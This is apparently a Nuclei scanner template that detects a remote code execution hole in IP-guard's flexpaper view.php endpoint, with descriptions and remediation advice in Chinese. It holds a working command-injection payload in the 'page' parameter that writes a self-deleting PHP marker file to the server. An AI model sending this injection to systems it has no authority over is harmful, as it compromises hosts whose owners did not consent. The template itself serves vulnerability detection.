id: ip-guard-view-rce
info:
  name: IP-guard view 接口 - 远程代码执行漏洞
  author: agap0rn15
  severity: critical
  description: |
    该模板用于检测 IP-guard view 接口 - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?...`、`/ipg/static/appr/lib/flexpaper/php/{{rInt1}}.php` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  reference:
    - https://stack.chaitin.com/vuldb/detail/a3fe58a9-ae2d-41e0-b0e2-d5a40cf3003e
  metadata:
    verified: true
    max-request: 2
    vuln-id: CT-959313
    vendor: ipguard
    product: ip-guard
  tags: rce,vuln,ipguard
variables:
  rStr0: '{{to_lower(rand_text_alpha(8))}}'
  rInt1: '{{rand_int(10000, 99999)}}'
flow: http(1) && http(2)
http:
  - method: GET
    path:
      - '{{BaseURL}}/ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+echo+"{{rStr0}}";+unlink(__FILE__);+?^>>{{rInt1}}.php'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(content_type, "application/x-shockwave-flash")'
  - method: GET
    path:
      - '{{BaseURL}}/ipg/static/appr/lib/flexpaper/php/{{rInt1}}.php'
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, rStr0)'
